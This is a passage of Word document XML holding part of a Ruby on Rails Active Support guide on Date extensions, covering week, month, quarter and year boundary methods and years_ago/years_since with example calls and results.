              <w:t>d.beginning_of_week(:sunday) # =&gt; Sun, 02 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2420556D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.end_of_week                # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="077A0EA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.end_of_week(:sunday)       # =&gt; Sat, 08 May 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FC4376F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_beginning_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_end_of_week</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558F88FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>monday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sunday</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E877939" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>monday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sunday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the dates for the beginning and end of the week, respectively. Weeks are assumed to start on Monday.</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CEF29FD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E4270B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 8)     # =&gt; Sat, 08 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45EA5992" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.monday                     # =&gt; Mon, 03 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A7B0803" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.sunday                     # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E2AB304" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_week</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37226DB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> receives a symbol with a day name in English (in lowercase, default is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:monday</w:t>
      </w:r>
      <w:r>
        <w:t>) and it returns the date corresponding to that day:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2000FCF0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3ED776A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 9) # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AEF7320" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.next_week              # =&gt; Mon, 10 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F2094FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.next_week(:saturday)   # =&gt; Sat, 15 May 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60F4583B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is analogous:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3D6C3ACC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18E9AF7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_week              # =&gt; Mon, 26 Apr 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57FE495E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_week(:saturday)   # =&gt; Sat, 01 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="515177C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.prev_week(:friday)     # =&gt; Fri, 30 Apr 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C187E78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prev_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last_week</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B8C40B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_month</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1545BCFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the dates for the beginning and end of the month:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="27FDDD6E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F6F9AA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 9) # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="678C348E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.beginning_of_month     # =&gt; Sat, 01 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08C92785" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.end_of_month           # =&gt; Mon, 31 May 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51247CB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_beginning_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_end_of_month</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD10AFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_quarter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119F6095" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the dates for the beginning and end of the quarter of the receiver’s calendar year:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7AA53464" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A48F17F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 9) # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B6565E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.beginning_of_quarter   # =&gt; Thu, 01 Apr 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C036E25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.end_of_quarter         # =&gt; Wed, 30 Jun 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2ED7CDF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_beginning_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_end_of_quarter</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2804B33A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_year</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575C8AA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the dates for the beginning and end of the year:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="384A9221" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="143F95DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.new(2010, 5, 9) # =&gt; Sun, 09 May 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6665026B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.beginning_of_year      # =&gt; Fri, 01 Jan 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C1AB97B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.end_of_year            # =&gt; Fri, 31 Dec 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FD4CBCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_beginning_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_end_of_year</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419AC904" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.3 Other Date Computations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1E86FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>years_ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>years_since</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D0D92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>years_ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> receives a number of years and returns the same date those many years ago:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4F9F9540" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B6E7155" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.new(2010, 6, 7)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66FE94CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.years_ago(10) # =&gt; Wed, 07 Jun 2000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="382DA01A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>years_since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> moves forward in time:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
